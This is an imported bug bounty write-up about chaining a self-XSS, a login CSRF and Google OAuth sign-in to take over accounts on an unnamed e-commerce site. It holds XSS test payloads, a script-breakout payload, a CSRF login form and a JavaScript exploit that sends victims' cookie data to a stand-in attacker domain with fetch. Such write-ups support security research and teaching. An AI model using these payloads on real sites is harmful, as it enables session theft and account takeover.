---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-02_self-xss-login-csrf-oauth-account-takeover.md
original_filename: 2024-07-02_self-xss-login-csrf-oauth-account-takeover.md
title: Self XSS + Login CSRF + OAuth = Account Takeover
category: documents
detected_topics:
- xss
- oauth
- sso
- access-control
- command-injection
- otp
tags:
- imported
- documents
- xss
- oauth
- sso
- access-control
- command-injection
- otp
language: en
raw_sha256: 8f3a1273c9a6f3277892103b1b2ba09bea8a71ceeaf76a67e469fd9041159975
text_sha256: 417ed0ab8dde0ff4d4116b5bef3e6f4a96972db2ed4eee39f6e84c0f6906e4ce
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Self XSS + Login CSRF + OAuth = Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-02_self-xss-login-csrf-oauth-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, oauth, sso, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `8f3a1273c9a6f3277892103b1b2ba09bea8a71ceeaf76a67e469fd9041159975`
- Text SHA256: `417ed0ab8dde0ff4d4116b5bef3e6f4a96972db2ed4eee39f6e84c0f6906e4ce`


## Content

---
title: "Self XSS + Login CSRF + OAuth = Account Takeover"
url: "https://medium.com/@l_s_/self-xss-login-csrf-oauth-account-takeover-6357f3395b49"
authors: ["LS (@Loupreme_)"]
bugs: ["Account takeover", "OAuth", "Login CSRF", "Self-XSS"]
publication_date: "2024-07-02"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 197
scraped_via: "browseros"
---

# Self XSS + Login CSRF + OAuth = Account Takeover

Self XSS + Login CSRF + OAuth = Account Takeover
Louis Shyers
Follow
7 min read
·
Jul 2, 2024

628

3

I recently submitted a report to a private program where I successfully chained the relatively the innocuous vulnerabilities of a Login CSRF and a Self XSS to achieve full account takeover of any Google OAuth user. Here’s how it went down:

Press enter or click to view image in full size
XSS

A refresher if you’re unfamiliar — XSS is a type of attack where a malicious actor finds away to inject malicious code that will execute in the context of a victim. There are 3 main types of XSS: Reflected, Stored and DOM.

We’re going to be focusing on Stored XSS, however you may have noticed the title of the post says “Self XSS”. Self XSS can be any one of the XSSes I mentioned however it can only be executed in the context of the attacker and not the victim … for now.

The target i’ve been working on (we’ll call platform.com) is an eCommerce site. By the nature of the business, a user profile only has so many places an attacker can inject malicious javascript code that would be executed by the browser. In my case the only fields I can modify on my profile were name, phone number and address. This is already very limiting and the bigger problem is that in a website like this you can’t directly target other users of the site, you have your own profile that you use to purchase items and thats it.

However, we’re going to try see what we can do, I immediately started trying to inject known JS payloads to see if I can get some XSS going.

Just the classic payloads:

"><svg/onload=prompt(1)>
<script>javascript:alert(1)</script\x0D>
<img src/onerror=prompt(1)>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

Any self respecting site in 2024 will have a firewall in place and that was the case here, Akamai was dropping my payloads faster than lightning

Press enter or click to view image in full size
every hackers favorite error

All right so this looked well protected, what else can I do here. Luckily i’ve been hacking on this target for a while and already collected several bounties so I had a decent idea of how the backend interacted with the front.

At some point when I changed my address I saw a request to accounts.platform.com/v1/account/{UserId}/address.

You can use your cookies on platform.com as an Authorization header to interact with this api and as luck would have it, this endpoint accepted PUT requests directly.

So you can send a PUT request to accounts.platform.com/v1/account/{UserID} to modify different fields of your account’s object, including your name. So I tried a simple HTML tag of <u>test and that worked. I then tried a more dangerous HTML tag of <script>, and to my surprise .. that also worked! So everything that was getting blocked on the frontend was now valid.

POV: there’s no firewall in place to ruin my day

Looking back at the DOM of the main homepage of platform.com, my first name is being reflected in a variable declaration within script tag that looked like this:

<script>
.
.
.
platform.FirstName = "<u>test"
platform.LastName = "test"
.
.
.
</script>

The natural thing to try here would be to break out of the variable context by closing it with a double quote add arbitrary JS function like alert() however this didn’t work for some reason (not sure why) BUT what did work was closing the entire script tag and opening a new one like so:

</script><script>alert(document.domain)</script>

I was able to send this string to the API as my first name and it was accepted, I signed back into platform.com and low and behold: the XSS alert fires

However, the problem remained: this was MY account, i’m looking at MY name and the XSS is executing only for me and there’s no way another user shopping on this site would be able to see my profile and get the XSS to fire for them. Most bug bounty programs need a POC for real impact a bug like this can cause. Enter CSRF

Cross Site Request Forgery (CSRF)

Another refresher — a CSRF is a type of attack that allows an attacker to induce a victim to perform unintended actions. This is done by creating a malicious HTML form that the user will have to visit, the contents of the form will send a request on behalf of the user for the target website, usually something sensitive like changing an email address to performing a bank transfer.

As you may imagine this sounds pretty straightforward to do and also defend against, developers usually implement a server generated token that would need to be attached to these kinds of requests, therefore a third party would have no way of knowing this unique token when they try submit a malicious request on behalf of a user.

Get Louis Shyers’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

However, the login functionality of a website is many times not protected by this sort of defense because an attacker forcing a victim to login to the attacker’s account isn’t really a vulnerability right? .. RIGHT?

(it is)

Turns out that is exactly what we needed to get our XSS to execute in someone else's context because we’ll be using CSRF to force a log in to our account and once they are in the XSS will execute.

This is what the HTML looked like for this:

<html>
<form enctype="application/x-www-form-urlencoded" method="POST" action="https://www.platform.com/loginto?submit=true"><table><tr><td>iwPreActions</td><td><input type="text" value="submit" name="iwPreActions"></td></tr>
<tr><td>next</td><td><input type="text" value="https%3A%2F%2Fwww.platform.com%2Fhome" name="next"></td></tr>
<tr><td>EmailAddress</td><td><input type="text" value={myemail} name="EmailAddress"></td></tr>
<tr><td>Password</td><td><input type="text" value={mypassword} name="Password"></td></tr>
</table><input type="submit" value="https://www.platform.com/loginto?submit=true"></form>
</html>

But again the issue remains, this is still on our account, any actions that you would perform would be in the victim’s context but under our session. This brings us to the final piece of the puzzle.

Google OAuth

Have you ever logged in to a website using your google account and it just took you in without having to put in any credentials? That’s the exact behavior i’m looking to exploit here. Platform.com did have Google OAuth sign in option where once the client was authorized, it does not prompt for credentials and will sign you in right away.

With this we can use the XSS to sign ourselves out while maintaining JS execution persistence using iframes and then forcing a Google sign in which will place us in the victims account while the XSS is still executing and then from here find a way to finally steal to fully takeover their account.

So if you’re keeping track this is the full exploit plan:

Change attacker first name to XSS payload
Force victim to sign in to our account via login CSRF
Once in, utilize XSS to sign ourselves out
Use XSS to auto sign in to victim’s account via Google OAuth
Find a way to perform an account takeover for maximum impact

The easy way to steal someone’s cookies is the classic document.cookie method however most modern web apps flag these cookies as HttpOnly meaning JS wouldn’t be able to read them. Once again with all the time i’ve spent on this site, some context knowledge came to help.

There was a periodic request to platform.com/app/OAuth that would return a JSON object of the same cookies that are marked HttpOnly, only this time they could definitely be read by JS since they are in the response body. From here all that’s left too do is grab those cookies and make a GET request to a server that I control with the cookie as a parameter value.

The JS to do all this ended up looking like this:

  document.body.innerHTML = '<html><body><center><h1>Testing</h1></center></body></html>';

// This is the iFrame to fully log the attacker logout
  var profileIframe = document.createElement('iframe');
  profileIframe.setAttribute('src', 'https://platform.com/logout');
  profileIframe.setAttribute('id', 'frame');
  document.body.appendChild(profileIframe);

  document.getElementById('frame').onload = function() {

// This is the iFrame to perform the Google SSO login for the victim who will be auto logged in
  var profileIframe1 = document.createElement('iframe');
  profileIframe1.setAttribute('src', 'https://www.platform.com/app/oauth/google/signin');
  profileIframe1.setAttribute('id', 'frame1');
  document.body.appendChild(profileIframe1);

// This function is to perform a refresh so the victim account is properly logged in to
  document.getElementById('frame1').onload = function() {

  var iframe = document.getElementById('frame');
  iframe.src = iframe.src
  }
  }
// This function is to send a request to /OAuth as the victim to getcookies, there are some timeouts to let it properly load.
//After the tokens are returned they are attached to a get request that is sent to an attacker controlled domain
  function sleep(ms) {
  return new Promise(resolve = > setTimeout(resolve, ms));
  }

  async
  function exfil() {
  await sleep(10000); 
  var profileIframe2 = document.createElement('iframe');
  profileIframe2.setAttribute('src', 'https://www.platform.com/app/OAuth');
  profileIframe2.setAttribute('id', 'frame2');
  document.body.appendChild(profileIframe2);
  await sleep(10000)
  var doc = frame2.contentDocument || iframe.contentWindow.document;
  var body = doc.documentElement.outerHTML
  fetch(`https: //ATTACKER-DOMAIN.com?exfil=${encodeURIComponent(body)}`), {
  method: 'GET'

  }
  }

  exfil()
  };
}, 20000);

The flow is straight forward here — by leveraging iframes I am able to continue the JS execution even after I log out of the account (attacker account) where the script was imported from. First iframe performs the log out, second iframe performs the Google SSO login and the third iframe fetches the token which is eventually exfiltrated.

In between the middle of all this I refresh the iframe because there was a weird quirk where the /logout endpoint follows a series of 302 redirects and doesn’t fully log out my account, this caused the JS to return the wrong tokens instead of the victim’s who is logged in via Frame1.

That completes the exploit, with 1 click on the victim’s end I am able to takeover any user’s account that utilizes Google OAuth login.

Takeaways:
Login/logout CSRFs can in fact be dangerous
Spend a lot of time understanding how every service on a site is integrated together
Always test on the most obvious places, you simply don’t know what you’re going to find
